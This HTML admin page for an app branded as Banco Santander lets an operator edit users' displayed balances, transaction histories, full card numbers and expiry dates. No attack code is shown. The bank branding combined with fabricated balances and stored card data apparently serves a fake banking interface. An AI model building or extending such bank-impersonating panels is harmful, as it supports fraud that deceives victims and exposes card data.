<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Administración — Santander</title>
    <link rel="icon" type="image/svg+xml"
        href="https://upload.wikimedia.org/wikipedia/commons/b/b8/Banco_Santander_Logotipo.svg">
    <link rel="stylesheet" href="auth.css">
</head>

<body class="admin-body">
    <header class="admin-header">
        <h1>Panel de Administración</h1>
        <div class="admin-header-actions">
            <span id="admin-email"></span>
            <button class="admin-btn admin-btn-secondary" id="btn-go-app">Ver App</button>
            <button class="admin-btn admin-btn-primary" id="btn-logout">Cerrar sesión</button>
        </div>
    </header>

    <main class="admin-container">
        <div class="admin-stats">
            <div class="admin-stat-card">
                <strong id="stat-total">0</strong>
                <span>Usuarios registrados</span>
            </div>
            <div class="admin-stat-card">
                <strong id="stat-admins">0</strong>
                <span>Administradores</span>
            </div>
        </div>

        <div class="admin-users-table">
            <table>
                <thead>
                    <tr>
                        <th>Usuario</th>
                        <th>Correo</th>
                        <th>Rol</th>
                        <th>Saldo</th>
                        <th>Última actualización</th>
                        <th>Acciones</th>
                    </tr>
                </thead>
                <tbody id="users-table-body">
                    <tr>
                        <td colspan="6" class="admin-empty">Cargando usuarios...</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </main>

    <div class="admin-modal" id="edit-modal">
        <div class="admin-modal-content">
            <h2>Editar ajustes del usuario</h2>
            <p class="user-email" id="edit-user-email"></p>

            <input type="hidden" id="edit-user-id">

            <label>Nombre de usuario:</label>
            <input type="text" id="edit-name">

            <label>Apellido / Subtítulo:</label>
            <input type="text" id="edit-subtitle">

            <label>Saldo General:</label>
            <input type="text" id="edit-balance">

            <label>Cuenta Corta (Inicio):</label>
            <input type="text" id="edit-account">

            <label>Celular:</label>
            <input type="text" id="edit-phone">

            <label>Tarjeta Completa:</label>
            <input type="text" id="edit-full-card">

            <label>Tipo de red (Franquicia):</label>
            <select id="edit-brand">
                <option value="VISA">VISA</option>
                <option value="Mastercard">Mastercard</option>
            </select>

            <label>Vencimiento:</label>
            <input type="text" id="edit-exp">

            <fieldset style="margin-top: 15px; border: 1px solid #CCC; padding: 10px; border-radius: 8px;">
                <legend style="padding: 0 5px; font-weight: bold; font-size:12px;">Movimientos / Cargos</legend>
                <div id="edit-movements-list"></div>
                <button type="button"
                    style="width: 100%; margin-top: 5px; padding: 8px; font-weight: bold; cursor:pointer; border: 1px dashed #ccc; border-radius: 6px; background: #fafafa;"
                    id="btn-add-mov-row">+ Añadir Movimiento</button>
            </fieldset>

            <div class="admin-modal-buttons">
                <button class="admin-save-btn" id="btn-save-settings">Guardar cambios</button>
                <button class="admin-cancel-btn" id="btn-close-modal">Cancelar</button>
            </div>
        </div>
    </div>

    <div id="admin-toast" class="admin-toast"></div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="js/config.js"></script>
    <script src="js/supabase-client.js"></script>
    <script src="js/auth.js"></script>
    <script src="js/settings-service.js"></script>
    <script src="js/admin.js"></script>
</body>

</html>
